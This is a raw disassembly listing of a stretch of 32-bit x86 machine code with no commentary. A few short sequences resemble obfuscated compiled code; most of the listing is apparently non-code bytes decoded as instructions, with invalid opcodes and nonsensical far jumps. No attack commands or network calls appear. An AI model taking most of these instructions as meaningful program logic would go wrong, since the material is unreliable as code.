  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     al,dl
  407a4b:	repz aaa 
  407a4d:	call   0x7cbd4e7b
  407a52:	xlat   BYTE PTR ds:[ebx]
  407a53:	jns    0x407ad1
  407a55:	jl     0x4079d7
  407a57:	ja     0x407ab3
  407a59:	mov    dh,0x49
  407a5b:	fst    DWORD PTR [ebx]
  407a5d:	cmp    al,0x9d
  407a5f:	scas   al,BYTE PTR es:[edi]
  407a60:	outs   dx,DWORD PTR ds:[esi]
  407a61:	and    ah,BYTE PTR [ecx+0x19]
  407a64:	in     al,0xbf
  407a66:	add    al,0xbf
  407a68:	dec    eax
  407a69:	scas   al,BYTE PTR es:[edi]
  407a6a:	adc    eax,ebp
  407a6c:	add    bh,BYTE PTR [esi]
  407a6e:	inc    ecx
  407a6f:	xchg   ebp,eax
  407a70:	sub    ebp,edi
  407a72:	cli    
  407a73:	push   ss
  407a74:	dec    esi
  407a75:	repnz out dx,al
  407a77:	lock stos DWORD PTR es:[edi],eax
  407a79:	stos   DWORD PTR es:[edi],eax
  407a7a:	xchg   ebp,eax
  407a7b:	inc    ecx
  407a7c:	mov    al,0x3c
  407a7e:	inc    ecx
  407a7f:	(bad)  
  407a80:	mov    al,ds:0x3b4288a7
  407a85:	jnp    0x407aa3
  407a87:	sbb    DWORD PTR [esi-0x4a848061],esi
  407a8d:	inc    ebx
  407a8e:	outs   dx,DWORD PTR ds:[esi]
  407a8f:	dec    esp
  407a90:	shl    edx,0x48
  407a93:	dec    esi
  407a94:	xor    BYTE PTR [ebx+0x4ad76de8],al
  407a9a:	push   esp
  407a9b:	push   ds
  407a9c:	and    eax,0x558e85ce
  407aa1:	jl     0x407a3a
  407aa3:	mov    esi,0xf3c31bf9
  407aa8:	push   eax
  407aa9:	js     0x407b1d
  407aab:	ud1    ebx,DWORD PTR [ebx-0x71]
  407aaf:	dec    ebp
  407ab0:	js     0x407b2e
  407ab2:	call   0xec:0xf3c1ad69
  407ab9:	fbstp  TBYTE PTR [edi]
  407abb:	loope  0x407a87
  407abd:	dec    ebx
  407abe:	jle    0x407ad4
  407ac0:	jmp    0x3ca2ffd7
  407ac5:	outs   dx,BYTE PTR ds:[esi]
  407ac6:	int3   
  407ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ac8:	mov    ecx,0x92c4a967
  407acd:	jb     0x407a95
  407acf:	cdq    
  407ad0:	dec    esp
  407ad1:	and    dl,BYTE PTR cs:[eax+0x47]
  407ad5:	sub    ah,BYTE PTR [eax+eax*2]
  407ad8:	sbb    dl,bh
  407ada:	jbe    0x407b05
  407adc:	arpl   WORD PTR [eax-0x2],di
  407adf:	and    al,0xf1
  407ae1:	push   ds
  407ae2:	pushf  
  407ae3:	adc    edi,DWORD PTR [edi+0x1f]
  407ae6:	add    al,0x9c
  407ae8:	daa    
  407ae9:	cwde   
  407aea:	retf   0xa65f
  407aed:	and    eax,DWORD PTR [ecx]
  407aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af0:	pop    esp
  407af1:	pop    edx
  407af2:	pusha  
  407af3:	ja     0x407b2f
  407af5:	lock and DWORD PTR [edx-0x2f],0xd6b8fc08
  407afd:	mov    ah,0x42
  407aff:	inc    edi
  407b00:	(bad)  
  407b01:	(bad)  
  407b02:	addr16 int 0x3
  407b05:	outs   dx,BYTE PTR ds:[esi]
  407b06:	mov    es,WORD PTR [edx+0x67fdba84]
  407b0c:	mov    dh,0x3e
  407b0e:	mov    edx,0x7ad28d61
  407b13:	jle    0x407b83
  407b15:	popa   
  407b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b17:	repz sti 
  407b19:	inc    edi
  407b1a:	or     esi,DWORD PTR [edx+0x270f6f28]
  407b20:	cwde   
  407b21:	movsx  edi,BYTE PTR [esi]
  407b24:	cld    
  407b25:	inc    esp
  407b26:	push   es
  407b27:	cmc    
  407b28:	lock mov DWORD PTR [esi-0x2de72d68],esp
  407b2f:	fwait
  407b30:	inc    esi
  407b31:	test   al,dh
  407b33:	or     ch,BYTE PTR [eax+0x43]
  407b36:	dec    edi
  407b37:	inc    esp
  407b38:	xor    eax,0x443bc037
  407b3d:	fs pop ss
  407b3f:	mov    ah,0x94
  407b41:	add    eax,0x7591b342
  407b46:	out    dx,al
  407b47:	repz sub al,0xd3
  407b4a:	mov    bl,0xe1
  407b4c:	jns    0x407b4c
  407b4e:	pop    ss
  407b4f:	push   es
  407b50:	out    0xe8,eax
  407b52:	xchg   DWORD PTR [ebp+0x6c],edx
  407b55:	push   0x50
  407b57:	jl     0x407af5
  407b59:	fisttp DWORD PTR [edx+ebx*2-0x564dd48c]
  407b60:	adc    bl,BYTE PTR [eax+0x67]
  407b63:	mov    bl,0x25
  407b65:	inc    esi
  407b66:	int3   
  407b67:	sahf   
  407b68:	mov    esi,0x28627d94
  407b6d:	xchg   BYTE PTR [ecx],dh
  407b6f:	adc    DWORD PTR [esi],ebp
  407b71:	and    eax,DWORD PTR [ecx+0x44cc9ddc]
  407b77:	test   cl,0x6f
  407b7a:	jae    0x407b5e
  407b7c:	outs   dx,BYTE PTR ds:[esi]
  407b7d:	loopne 0x407b5c
  407b7f:	popf   
  407b80:	or     ebx,DWORD PTR [ebp+0x3c]
  407b83:	xor    ebx,edx
  407b85:	shl    dh,0x4d
  407b88:	jmp    0xd628:0x153cea6b
  407b8f:	sbb    ebx,DWORD PTR [esi+0x33430173]
  407b95:	sti    
  407b96:	aad    0xc5
  407b98:	mov    eax,0xaa162f13
  407b9d:	pop    esi
  407b9e:	add    eax,esi
  407ba0:	pop    edx
  407ba1:	mov    esp,0x4faa2db8
  407ba6:	xor    edx,eax
  407ba8:	jb     0x407b51
  407baa:	push   es
  407bab:	popa   
  407bac:	cmc    
  407bad:	sub    eax,0x81b44340
  407bb2:	dec    ecx
  407bb3:	dec    esi
  407bb4:	outs   dx,BYTE PTR ds:[esi]
  407bb5:	sbb    edi,ebp
  407bb7:	sub    esp,DWORD PTR ds:0xf16f4301
  407bbd:	mov    esp,0xa8f8dfe4
  407bc2:	mov    dh,0x68
  407bc4:	push   es
  407bc5:	sar    esp,0xc2
  407bc8:	xchg   BYTE PTR [esi-0x59],ch
  407bcb:	pop    esi
  407bcc:	or     BYTE PTR [edi-0x6a],0xfb
  407bd0:	rcl    DWORD PTR [ebx],1
  407bd2:	es ffree st(5)
  407bd6:	inc    ecx
  407bd7:	push   bx
  407bd9:	or     BYTE PTR [ecx+eiz*1-0x42fc74b3],cl
  407be0:	(bad)
  407be4:	and    ah,BYTE PTR [edx]
  407be6:	push   esp
  407be7:	jno    0x407c66
  407be9:	or     edi,DWORD PTR [ecx-0x5b61ae7c]
  407bef:	in     al,dx
  407bf0:	or     esi,DWORD PTR [edi-0x22]
  407bf3:	arpl   WORD PTR [esi-0x4a6b756b],si
  407bf9:	das    
  407bfa:	test   BYTE PTR [esi],dl
  407bfc:	call   0x7501:0x3cf5335
  407c03:	or     ecx,DWORD PTR [edi]
  407c05:	xchg   esp,eax
  407c06:	mov    ebx,DWORD PTR [ebp*2+0x62c04bb3]
  407c0d:	dec    esi
  407c0e:	adc    DWORD PTR [edx+0x49453abf],ecx
  407c14:	(bad)  
  407c15:	xlat   BYTE PTR ds:[ebx]
  407c16:	bound  edx,QWORD PTR [esi-0x1784d1e3]
  407c1c:	into   
  407c1d:	les    ecx,FWORD PTR [esi]
  407c1f:	xor    eax,0xb7a82d6d
  407c24:	outs   dx,BYTE PTR ds:[esi]
  407c25:	xchg   edi,eax
  407c26:	xchg   DWORD PTR ds:0xb0b71855,eax
  407c2c:	jmp    0x4a1a0cba
  407c31:	jl     0x407bbf
  407c33:	fidivr DWORD PTR [ebx]
  407c35:	addps  xmm7,XMMWORD PTR [edi+0x1e]
  407c39:	addr16 mov eax,0x1b7030c4
  407c3f:	adc    BYTE PTR [edi-0x69],0x45
  407c43:	pop    ebp
  407c44:	fist   DWORD PTR ds:0xadaaf173
  407c4a:	sub    eax,0x13f25ebe
  407c4f:	mov    bh,0x61
  407c51:	sbb    al,0xd
  407c53:	rcr    eax,0x4b
  407c56:	in     eax,0x5a
  407c58:	mov    cl,bl
  407c5a:	xor    al,0x79
  407c5c:	cmp    bl,BYTE PTR [esi]
  407c5e:	hlt    
  407c5f:	push   cs
  407c60:	mov    bh,0xbf
  407c62:	pop    DWORD PTR [eax-0x42836d16]
  407c68:	das    
  407c69:	inc    ebx
  407c6a:	out    0x9c,al
  407c6c:	sub    esi,DWORD PTR [ebp-0x19]
  407c6f:	(bad)  
  407c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c71:	adc    al,0xfd
  407c73:	inc    ebp
  407c74:	mov    BYTE PTR ds:0x8812e102,cl
  407c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c7b:	jae    0x407c68
  407c7d:	jmp    0x90f7:0x57896202
  407c84:	ss inc eax
  407c86:	loop   0x407c9c
  407c88:	push   ds
  407c89:	push   cs
  407c8a:	pop    eax
  407c8b:	and    eax,0x3ec9a157
  407c90:	mov    ebx,0x36d79e28
  407c95:	imul   edx,DWORD PTR [ecx+ebp*8+0x72],0xffffffcd
  407c9a:	mov    WORD PTR ds:0xc02d53fb,ds
  407ca0:	mov    eax,ds:0xf6362de3
  407ca5:	jecxz  0x407c4b
  407ca7:	xor    DWORD PTR [edx-0x7e5d6546],ecx
  407cad:	dec    esi
  407cae:	jmp    0x636f7b3a
  407cb3:	mov    ds,WORD PTR [ecx+0x23]
  407cb6:	test   DWORD PTR [edx+ebp*4+0x7e43b867],0x87768e91
  407cc1:	xchg   esp,eax
  407cc2:	mov    bh,0x68
  407cc4:	push   ds
  407cc5:	enter  0xe1fe,0x62
  407cc9:	call   0x19330ba2
  407cce:	pusha  
  407ccf:	push   cs
  407cd0:	and    eax,0xabfaf6ec
  407cd5:	adc    ecx,DWORD PTR [ecx+0x70]
  407cd8:	push   ss
  407cd9:	xchg   DWORD PTR [edi],ecx
  407cdb:	mov    bh,0x56
  407cdd:	outs   dx,DWORD PTR ds:[esi]
  407cde:	cmp    DWORD PTR [edi+0x49b94a12],0xffffff99
  407ce5:	pop    eax
  407ce6:	fidiv  WORD PTR [ebx+0x47]
  407ce9:	xchg   dh,cl
  407ceb:	push   ebx
  407cec:	jne    0x407c7b
  407cee:	loop   0x407d3d
  407cf0:	adc    al,0xbf
  407cf2:	loop   0x407c97
  407cf4:	xlat   BYTE PTR ds:[ebx]
  407cf5:	repnz push ds
  407cf7:	and    ah,BYTE PTR [ecx]
  407cf9:	ffreep st(6)
  407cfb:	aas    
  407cfc:	jb     0x407d11
  407cfe:	aaa    
  407cff:	inc    ebx
  407d00:	data16 cmp cl,bl
  407d03:	xor    eax,0x5335a400
  407d08:	out    dx,al
  407d09:	dec    ecx
  407d0a:	mov    eax,0x16e36707
  407d0f:	adc    al,0xeb
  407d11:	and    BYTE PTR [bx+di+0x1785],bh
  407d16:	push   ds
  407d17:	sar    ebx,1
  407d19:	popa   
  407d1a:	lahf   
  407d1b:	mul    edi
  407d1d:	outs   dx,BYTE PTR ds:[esi]
  407d1e:	push   0x69cdee57
  407d23:	pop    esi
  407d24:	fidivr DWORD PTR [eax-0x6b]
  407d27:	daa    
  407d28:	lea    ecx,[eax+ecx*4-0x6531dcb1]
  407d2f:	jl     0x407d85
  407d31:	and    edi,edx
  407d33:	stos   BYTE PTR es:[edi],al
  407d34:	dec    edi
  407d35:	out    0xe7,eax
  407d37:	dec    ecx
  407d38:	adc    edx,DWORD PTR [eax]
  407d3a:	ja     0x407d76
  407d3c:	ret    
  407d3d:	sbb    cl,ah
  407d3f:	fisttp QWORD PTR [ebp-0x51]
  407d42:	sar    BYTE PTR [ebx-0x50],cl
  407d45:	push   edi
  407d46:	stc    
  407d47:	sub    esp,DWORD PTR [edx+0xc7419f4]
  407d4d:	push   es
  407d4e:	mov    DWORD PTR [edi+0x4eee734c],esi
  407d54:	mov    bh,0x7e
  407d56:	sbb    al,0xed
  407d58:	pop    esi
  407d59:	mov    al,ds:0xa64d23dd
  407d5e:	sbb    DWORD PTR ds:0x1383697b,ebp
  407d64:	js     0x407d83
  407d66:	(bad)  
  407d67:	out    dx,eax
  407d68:	adc    eax,DWORD PTR [edx-0x72]
  407d6b:	mov    al,0xcb
  407d6d:	or     al,0x94
  407d6f:	jl     0x407d3d
  407d71:	mov    edi,0xeb903bc1
  407d76:	pop    ebx
  407d77:	mov    ebx,eax
  407d79:	leave  
  407d7a:	inc    eax
  407d7b:	add    ch,BYTE PTR [edi-0x1c]
  407d7e:	gs pop ds
  407d80:	push   ds
  407d81:	cld    
  407d82:	dec    ecx
  407d83:	aaa    
  407d84:	inc    esp
  407d85:	sbb    eax,0xd88772db
  407d8a:	inc    esp
  407d8b:	mov    bh,BYTE PTR ds:0xfd507c5a
  407d91:	jmp    0x4ce75751
  407d96:	retf   
  407d97:	dec    ebx
  407d98:	jne    0x407d4a
  407d9a:	(bad)  
  407d9c:	mov    ecx,0xe7195a1d
  407da1:	aad    0xcc
  407da3:	aaa    
  407da4:	fadd   QWORD PTR [esi+0x72]
  407da7:	nop
  407da8:	hlt    
  407da9:	jp     0x407d39
  407dab:	aam    0xcc
  407dad:	mov    bh,0x42
  407daf:	imul   edx,edx,0xf89ea9e8
  407db5:	mov    DWORD PTR [eax],edx
  407db7:	mov    eax,DWORD PTR [ebp-0xc]
  407dba:	cmp    eax,0x58133098
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     bh,BYTE PTR [ebx]
  407dd1:	iret   
  407dd2:	inc    ebp
  407dd3:	xchg   edi,eax
  407dd4:	adc    cl,0x7c
  407dd7:	jl     0x407db0
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407ded
  407ddd:	repnz add eax,DWORD PTR [esi-0x4]
  407de1:	mov    dh,0xe4
  407de3:	sbb    edi,ecx
  407de5:	das    
  407de6:	imul   esp,esp,0xffffffe9
  407de9:	out    0x8b,al
  407deb:	(bad)  
  407dec:	lahf   
  407ded:	mov    bl,0x5
  407def:	pop    edi
  407df0:	test   BYTE PTR [esi],0x69
  407df3:	iret   
  407df4:	mov    edx,0x8d8940fe
  407df9:	pop    es
  407dfa:	jnp    0x407da2
  407dfc:	add    BYTE PTR [ebp+0x33c3a251],ch
  407e02:	cmp    DWORD PTR [ebp-0x1b],edi
  407e05:	(bad)  
  407e06:	mov    DWORD PTR [edx-0x67],esi
  407e09:	icebp  
  407e0a:	inc    ebp
  407e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e0c:	stos   BYTE PTR es:[edi],al
  407e0d:	aam    0xa
  407e0f:	xor    ebx,DWORD PTR [ebx+0x40c9300f]
  407e15:	push   cs
  407e16:	sahf   
  407e17:	xor    al,0x69
  407e19:	mov    ebp,0x74ea43fd
  407e1e:	mov    al,0x8c
  407e20:	xor    esi,eax
  407e22:	(bad)  
  407e23:	js     0x407e4a
  407e25:	pop    edi
  407e26:	sub    DWORD PTR [edx-0x3899979c],0x2d026307
  407e30:	nop
  407e31:	dec    ecx
  407e32:	(bad)  
  407e33:	jne    0x407def
  407e35:	fdivr  QWORD PTR [edx-0x3f28b4bf]
  407e3b:	xchg   ebx,eax
  407e3c:	sar    BYTE PTR [edi-0x25],1
  407e3f:	xchg   edx,eax
  407e40:	fwait
  407e41:	jg     0x407df9
  407e43:	jnp    0x407e69
  407e45:	cmp    cl,al
  407e47:	mov    edi,0x94b8d323
  407e4c:	and    ecx,ebp
  407e4e:	cmp    BYTE PTR [edx+0x73305f3c],dl
  407e54:	add    edx,DWORD PTR [edx+0x27bce045]
  407e5a:	add    ebx,edi
  407e5c:	push   cs
  407e5d:	mov    DWORD PTR [edi],ebp
  407e5f:	add    edi,DWORD PTR [ebp+0x39]
  407e62:	loop   0x407e88
  407e64:	aam    0xbf
  407e66:	fwait
  407e67:	pushf  
  407e68:	(bad)  
  407e69:	mov    ah,0xa4
  407e6b:	dec    ebx
  407e6c:	push   0xa7ae7ed
  407e71:	dec    esi
  407e72:	test   eax,0x3bbf2bbf
  407e77:	inc    esi
  407e78:	adc    al,0xa6
  407e7a:	fucomip st,st(7)
  407e7c:	lock xor al,0x10
  407e7f:	adc    ebx,DWORD PTR [ecx]
  407e81:	xchg   DWORD PTR [eax],esp
  407e83:	mov    dl,0x5c
  407e85:	es mov edx,0x145e9ca9
  407e8b:	pop    esp
  407e8c:	push   eax
  407e8d:	cdq    
  407e8e:	fsubr  DWORD PTR [ecx-0x9]
  407e91:	dec    esp
  407e92:	dec    ecx
  407e93:	push   edi
  407e94:	jecxz  0x407eaa
  407e96:	(bad)  
  407e97:	and    eax,0xdc304170
  407e9c:	and    eax,0x639620e2
  407ea1:	xlat   BYTE PTR ds:[ebx]
  407ea2:	fst    QWORD PTR [edx]
  407ea4:	pop    esp
  407ea5:	into   
  407ea6:	xchg   ebp,eax
  407ea7:	outs   dx,DWORD PTR ds:[esi]
  407ea8:	hlt    
  407ea9:	mov    bl,BYTE PTR [edi+eax*8+0x6d]
  407ead:	sbb    eax,0x8b55542c
  407eb2:	pop    eax
  407eb3:	sti    
  407eb4:	data16 mov dh,0x20
  407eb7:	adc    bh,bl
  407eb9:	rcl    BYTE PTR [ebp+0x6d],0x83
  407ebd:	mov    bl,0x45
  407ebf:	call   0x1de20e54
  407ec4:	lods   eax,DWORD PTR ds:[esi]
  407ec5:	xchg   ebp,eax
  407ec6:	enter  0xe629,0x47
  407eca:	fld    DWORD PTR [ecx+0x245d388e]
  407ed0:	int    0xd3
  407ed2:	fbstp  TBYTE PTR [edx+0x5730627b]
  407ed8:	shr    DWORD PTR [ecx+0x65],0x9
  407edc:	jge    0x407e64
  407ede:	std    
  407edf:	fwait
  407ee0:	cmp    BYTE PTR [eax-0x43],ah
  407ee3:	nop
  407ee4:	rcr    BYTE PTR [eax],0xa2
  407ee7:	sbb    bl,BYTE PTR [ecx-0x79]
  407eea:	sbb    eax,0x68836742
  407eef:	inc    esp
  407ef0:	lea    esi,[eax+0x13b4a915]
  407ef6:	mov    esp,0xd935b972
  407efb:	es out dx,al
  407efd:	and    al,0x17
  407eff:	mov    eax,ds:0xbb0619d3
  407f04:	out    dx,eax
  407f05:	push   eax
  407f06:	out    0xab,al
  407f08:	push   0x450a4695
  407f0d:	into   
  407f0e:	mov    al,ds:0x2df040c
  407f13:	retf   0x8726
  407f16:	outs   dx,BYTE PTR ds:[esi]
  407f17:	dec    esp
  407f18:	mov    ds:0x673fd426,eax
  407f1d:	inc    esp
  407f1e:	push   eax
  407f1f:	pusha  
  407f20:	mov    bl,0xf7
  407f22:	pop    eax
  407f23:	pop    es
  407f24:	sbb    BYTE PTR [ebx+edx*1],0x34
  407f28:	daa    
  407f29:	adc    BYTE PTR [ebx-0x1c],dl
  407f2c:	xchg   esp,eax
  407f2d:	outs   dx,BYTE PTR ds:[esi]
  407f2e:	jmp    0xa2545219
  407f33:	fnstcw WORD PTR [edx]
  407f35:	cld    
  407f36:	dec    ebp
  407f37:	mov    edx,0x22578aaf
  407f3c:	iret   
  407f3d:	mov    dh,0x45
  407f3f:	inc    ebp
  407f40:	pop    eax
  407f41:	(bad)  
  407f42:	rcr    BYTE PTR [ebp-0x3c],1
  407f45:	stos   DWORD PTR es:[edi],eax
  407f46:	imul   ebp,esi,0xffffff87
  407f49:	mov    ?,WORD PTR [ecx]
  407f4b:	cwde   
  407f4c:	push   ecx
  407f4d:	cld    
  407f4e:	test   DWORD PTR ds:0x3fc417bf,edi
  407f54:	xchg   BYTE PTR [ecx+0x72b9a821],al
  407f5a:	add    DWORD PTR [ecx+0x5935878f],esp
  407f60:	xchg   edi,eax
  407f61:	jp     0x407f10
  407f63:	nop
  407f64:	test   ah,ah
  407f66:	lahf   
  407f67:	inc    esp
  407f68:	xor    bh,al
  407f6a:	inc    ebx
  407f6b:	(bad)  
  407f6c:	push   edi
  407f6d:	in     al,dx
  407f6e:	repz jmp 0x2cac3194
  407f74:	xchg   edi,eax
  407f75:	pop    es
  407f76:	adc    ebp,ebp
  407f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f79:	push   0xffffffc0
  407f7b:	xchg   BYTE PTR [edx],bh
  407f7d:	add    BYTE PTR [ecx+ebx*1],dh
  407f80:	dec    ebx
  407f81:	lahf   
  407f82:	gs pop ecx
  407f84:	xchg   ecx,eax
  407f85:	xchg   ebx,eax
  407f86:	iret   
  407f87:	and    BYTE PTR [edx+0x5],bl
  407f8a:	fnstsw ax
  407f8c:	retf   
  407f8d:	fsub   QWORD PTR [ebx-0xeea3502]
  407f93:	push   edi
  407f94:	add    ecx,DWORD PTR [edi]
  407f96:	mov    esp,DWORD PTR [edx-0x63]
  407f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f9a:	aas    
  407f9b:	cmp    edi,ebp
  407f9d:	jg     0x407f67
  407f9f:	lods   eax,DWORD PTR ds:[esi]
  407fa0:	test   BYTE PTR [ebx+0x25],dh
  407fa3:	inc    eax
  407fa4:	data16 mov bl,al
  407fa7:	xchg   edi,eax
  407fa8:	mov    dl,0xb8
  407faa:	test   DWORD PTR [esi+edi*1+0x13],0x8df0c42
  407fb2:	jecxz  0x408020
  407fb4:	xchg   esi,eax
  407fb5:	in     al,0x8d
  407fb7:	(bad)  [ecx]
  407fb9:	jle    0x407f93
  407fbb:	ucomiss xmm1,xmm7
  407fbe:	loop   0x407ff5
  407fc0:	add    esi,DWORD PTR [edi]
  407fc2:	sub    al,0x22
  407fc4:	xor    dl,BYTE PTR [ebx-0x71802019]
  407fca:	xor    esp,DWORD PTR [ecx-0xd3d5c5]
  407fd0:	jns    0x408012
  407fd2:	js     0x407fed
  407fd4:	xor    esp,DWORD PTR [esi+0x1c]
  407fd7:	pop    ebx
  407fd8:	add    al,0x93
  407fda:	call   0x84b0:0x23424c25
  407fe1:	jge    0x408000
  407fe3:	retf   
  407fe4:	hlt    
  407fe5:	test   BYTE PTR [ebp+0x5],0xf9
  407fe9:	jne    0x408056
  407feb:	(bad)  
  407fec:	ror    BYTE PTR [ebp-0x7b],1
  407fef:	mov    cl,0xd1
  407ff1:	xor    DWORD PTR [ebp-0x4e],0xa911c8b8
  407ff8:	mov    ds:0xfe5507b8,al
  407ffd:	mov    dh,0x0
  407fff:	xchg   DWORD PTR [edx+0x2],edx
  408002:	jae    0x407fcf
  408004:	sub    DWORD PTR [eax+0x73d66598],ebp
  40800a:	sbb    al,0x44
  40800c:	stos   BYTE PTR es:[edi],al
  40800d:	shl    DWORD PTR [esi+0x40221d86],1
  408013:	popa   
  408014:	mov    bl,0x3d
  408016:	repnz pop edi
  408018:	jne    0x407fd5
  40801a:	sahf   
  40801b:	push   cs
  40801c:	pop    ss
  40801d:	adc    al,0x90
  40801f:	pop    esp
  408020:	cli    
  408021:	mov    al,ds:0xe372110f
  408026:	xor    eax,0xfbd16c71
  40802b:	inc    ebp
  40802c:	mov    DWORD PTR [eax],ecx
  40802e:	xor    eax,0xa306f095
  408033:	or     eax,0x66debc2c
  408038:	test   BYTE PTR [edi],0x43
  40803b:	mov    bh,0x6c
  40803d:	push   edi
  40803e:	and    eax,0x1ddae6f4
  408043:	dec    esp
  408044:	aas    
  408045:	xor    ebp,DWORD PTR [ecx+0x6fab3f91]
  40804b:	mov    edx,0x66eb6e44
  408050:	adc    al,0x18
  408052:	add    DWORD PTR [edi+0x55],esp
  408055:	sbb    dl,al
  408057:	lds    ecx,FWORD PTR [edi-0x5e]
  40805a:	fild   QWORD PTR [ecx-0x7176fbd]
  408060:	cmc    
  408061:	aam    0x30
  408063:	je     0x408021
  408065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408066:	dec    ebx
  408067:	sbb    al,0xb
  408069:	test   DWORD PTR [eax-0x8],esp
  40806c:	pop    es
  40806d:	mov    ebp,0x9646d759
  408072:	pusha  
  408073:	std    
  408074:	push   0xfffffffc
  408076:	(bad)  
  408077:	test   ch,0xb7
  40807a:	rcr    BYTE PTR [ebx-0x3fdd135c],0xcd
  408081:	adc    esp,0xffffffb4
  408084:	add    eax,0xf002f8b5
  408089:	dec    ecx
  40808a:	and    BYTE PTR [edx+0x3a6b481a],al
  408090:	(bad)  
  408091:	jbe    0x408076
  408093:	scas   al,BYTE PTR es:[edi]
  408094:	sub    ch,BYTE PTR [edx]
  408096:	inc    ecx
  408097:	mov    BYTE PTR ds:0xdb2d20,0xc0
  40809e:	popa   
  40809f:	mov    WORD PTR [esi-0xd],cs
  4080a2:	loop   0x408075
  4080a4:	out    dx,al
  4080a5:	fldenv [edx+0x6ff5205a]
  4080ab:	and    eax,DWORD PTR [edx-0x33]
  4080ae:	ret    0xc5c4
  4080b1:	sahf   
  4080b2:	cmp    eax,DWORD PTR [ebp*1+0x2bde25ba]
  4080b9:	lock pop esi
  4080bb:	fist   DWORD PTR [ecx]
  4080bd:	jg     0x4080b8
  4080bf:	outs   dx,BYTE PTR ds:[esi]
  4080c0:	aad    0x59
  4080c2:	pop    ss
  4080c3:	dec    esi
  4080c4:	mov    ebx,DWORD PTR [ebx-0x10bdccf6]
  4080ca:	xchg   bl,dh
  4080cc:	nop
  4080cd:	in     al,0xf0
  4080cf:	dec    edx
  4080d0:	jmp    0xaaa541c
  4080d5:	stc    
  4080d6:	lods   eax,DWORD PTR ds:[esi]
  4080d7:	mov    ch,0x7
  4080d9:	pusha  
  4080da:	xchg   edx,eax
  4080db:	mov    eax,0x68023b7a
  4080e0:	aaa    
  4080e1:	mov    bl,0x16
  4080e3:	mov    eax,0x4bd8dd4d
  4080e8:	sub    DWORD PTR [eax],ecx
  4080ea:	cmp    BYTE PTR [esi+0x71],bh
  4080ed:	push   es
  4080ee:	(bad)  
  4080ef:	fcmovu st,st(1)
  4080f1:	dec    eax
  4080f2:	dec    ebp
  4080f3:	dec    eax
  4080f4:	jnp    0x40809b
  4080f6:	lods   eax,DWORD PTR ds:[esi]
  4080f7:	jo     0x4080ae
  4080f9:	(bad)  
  4080fa:	inc    DWORD PTR [edi+0x4c91ead9]
  408100:	fwait
  408101:	push   eax
  408102:	xor    BYTE PTR [edi-0x7f],0x43
  408106:	mov    edi,ebx
  408108:	lahf   
  408109:	pop    ecx
  40810a:	in     eax,0xc8
  40810c:	pop    eax
  40810d:	inc    edx
  40810e:	xchg   ecx,eax
  40810f:	inc    edi
  408110:	xchg   ecx,eax
  408111:	inc    esp
  408112:	push   edx
  408113:	cwde   
  408114:	and    eax,0xfca6774e
  408119:	push   ds
  40811a:	bound  edi,QWORD PTR [edx-0x47]
  40811d:	sub    al,0xa2
  40811f:	xor    eax,0x178b8b81
  408124:	hlt    
  408125:	sub    al,0x7f
  408127:	mov    eax,0xd77b37dc
  40812c:	mov    al,0xf9
  40812e:	inc    ecx
  40812f:	pop    ss
  408130:	outs   dx,BYTE PTR ds:[esi]
  408131:	xor    edx,DWORD PTR [ebp+0x2a]
  408134:	aas    
  408135:	je     0x4084c8
  40813b:	mov    eax,DWORD PTR [ebp-0x1c]
  40813e:	or     DWORD PTR [eax],0x60751c98
  408144:	jmp    0x4084ba
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    eax,DWORD PTR [esi]
  408156:	out    dx,al
  408157:	in     al,dx
  408158:	fstp   QWORD PTR [ebx-0x2e]
  40815b:	jl     0x4081d9
  40815d:	xlat   BYTE PTR ds:[ebx]
  40815e:	jns    0x4081dc
  408160:	jl     0x4080fc
  408162:	mov    ah,0x4b
  408164:	inc    esp
  408165:	fucomp st(3)
  408167:	lds    ecx,FWORD PTR ds:0xcda29be4
  40816d:	sahf   
  40816e:	ds (bad) 
  408170:	and    BYTE PTR [eax+0x63],ch
  408173:	mov    WORD PTR [eax],?
  408175:	add    al,0xe4
  408177:	lods   al,BYTE PTR ds:[esi]
  408178:	(bad)  
  408179:	popf   
  40817a:	(bad)  [edi-0x39]
  40817d:	inc    esi
  40817e:	ret    
  40817f:	add    eax,0x11ec6c8d
  408184:	push   ss
  408185:	jae    0x408112
  408187:	xor    BYTE PTR [esi],al
  408189:	mov    dl,0xc6
  40818b:	addr16 mov ds:0xbb38,al
  40818f:	mov    ah,bl
  408191:	jno    0x408124
  408193:	lods   al,BYTE PTR ds:[esi]
  408194:	not    BYTE PTR [eax+0x5d15d932]
  40819a:	and    DWORD PTR [esi],ebp
  40819c:	mov    ebx,0x960cf9fe
  4081a1:	mov    dh,0xda
  4081a3:	adc    al,0x5a
  4081a5:	pusha  
  4081a6:	sar    WORD PTR [edx+0x15fbab78],1
  4081ad:	cmp    DWORD PTR [ebx+0x2b2f829c],ebx
  4081b3:	lahf   
  4081b4:	mov    ah,0xb7
  4081b6:	mov    ecx,0x485bb7cd
  4081bb:	arpl   WORD PTR [ebp-0x19],bp
  4081be:	stc    
